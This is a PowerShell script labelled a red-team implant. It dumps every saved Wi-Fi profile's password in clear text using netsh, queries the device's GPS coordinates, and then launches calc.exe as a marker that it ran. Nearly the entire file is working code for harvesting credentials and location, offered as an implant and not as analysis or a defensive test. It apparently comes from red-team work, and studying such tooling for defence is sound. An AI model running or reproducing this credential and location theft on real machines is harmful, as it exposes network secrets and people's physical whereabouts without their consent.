Write-Host "Hello World from Kushy Red Team Implant"

function Get-WifiCredentials {
    netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
        $_ -match ':(.+)$'
        $profile = $matches[1].Trim()
        netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' |
            ForEach-Object {
                $_ -match ':(.+)$'
                [PSCustomObject]@{
                    Profile  = $profile
                    Password = if ($matches[1].Trim()) { $matches[1].Trim() } else { 'N/A' }
                }
            }
    }
}

$credentials = Get-WifiCredentials

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton
	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  
	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		$GL = $GL -split " "
		$Lat = $GL[0].Substring(11) -replace ".$"
		$Lon = $GL[1].Substring(10) -replace ".$" 
		return $Lat, $Lon
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 
}

$Lat, $Lon = Get-GeoLocation

Start-Process calc.exe
